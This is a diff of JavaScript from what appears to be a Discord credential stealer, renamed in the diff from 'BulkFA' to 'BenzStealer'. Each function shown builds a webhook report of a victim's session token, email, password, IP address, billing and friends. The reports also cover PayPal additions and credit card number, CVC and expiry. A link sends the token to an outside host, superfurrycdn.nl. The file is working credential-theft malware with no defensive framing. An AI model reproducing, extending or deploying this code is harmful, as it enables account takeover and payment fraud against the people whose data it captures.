@@ -584,37 +584,37 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '<a:946246524634009600:990956317101424650> Token:',
-            value: `\`${token}\` [\`Click Token\`](https://superfurrycdn.nl/copy/${token})`,
+            name: '<a:944007295417843743:959785231982931979> Token:',
+            value: `\`${token}\` [Click to copy](https://superfurrycdn.nl/copy/{token})`,
             inline: false,
           },
           {
-            name: '<:946246524172636161:990956262168617020> Badges:',
+            name: '<a:satanist:802503618972483615> Badges:',
             value: `${badges}`,
             inline: true,
           },
           {
-            name: '<:946246524285878343:990956250382606376> Nitro:',
-            value: `${nitro}`,
+            name: '<:944007233820307467:959785232037470208> Billing:',
+            value: `**${billing}**`,
             inline: true,
           },
           {
-            name: '<a:946246524524978196:990956270624325662> Billing:',
-            value: `${billing}`,
+            name: '<:944007233820307467:959785232037470208> Friends:',
+            value: `\`${friends}\``,
             inline: true,
           },
           {
-            name: '<:946246524826968104:990956293919490068> IP:',
-            value: `\`${config.ip}\`\n[IpInfo](https://ipinfo.io/${ip})`,
-            inline: true,
-          },
-          {
-            name: '<:946246524516581396:990956286189383780> Email:',
+            name: '<:944007233820307467:959785232037470208> Email:',
             value: `\`${email}\``,
             inline: true,
           },
           {
-            name: '<a:946246524302655501:990956306355593276> Password:',
+            name: '<:944007233820307467:959785232037470208> IP:',
+            value: `\`${config.ip}\``,
+            inline: true,
+          },
+          {
+            name: '<a:satan:846706207632261120> Password:',
             value: `\`${password}\``,
             inline: true,
           },
@@ -670,7 +670,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'BulkFA',
+          text: 'BenzStealer',
         },
       },
     ],
@@ -712,7 +712,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'BulkFA',
+          text: 'BenzStealer',
         },
       },
     ],
@@ -754,7 +754,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'BulkFA',
+          text: 'BenzStealer',
         },
       },
     ],
@@ -796,7 +796,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'BulkFA',
+          text: 'BenzStealer',
         },
       },
     ],
@@ -840,7 +840,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'BulkFA',
+          text: 'BenzStealer',
         },
       },
     ],
